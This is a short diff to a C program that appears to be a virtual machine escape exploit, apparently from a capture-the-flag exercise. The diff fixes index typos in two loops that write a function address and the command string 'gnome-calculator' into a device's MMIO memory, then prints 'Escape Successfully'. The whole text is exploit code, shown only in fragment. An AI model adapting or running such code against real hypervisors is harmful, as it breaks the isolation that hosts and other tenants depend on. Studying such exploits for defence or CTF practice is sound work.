@@ -106,7 +106,7 @@ int main(int argc, char *argv[])
 
     set_flag(1);
     for(int i=0;i<8;i++){
-        *(char *)(mmio_mem+0x800+i)=magic_func_addr[I];
+        *(char *)(mmio_mem+0x800+i)=magic_func_addr[i];
     }
     set_flag(3);
     magic = *(char *)(mmio_mem);
@@ -114,7 +114,7 @@ int main(int argc, char *argv[])
     char *cmd="gnome-calculator\x00";
     set_flag(1);
     for(int i=0;i<strlen(cmd)+1;i++){
-        *(char *)(mmio_mem+0x800+i)=cmd[I];
+        *(char *)(mmio_mem+0x800+i)=cmd[i];
     }
     puts("[+] Escape Successfully");
     set_flag(3);
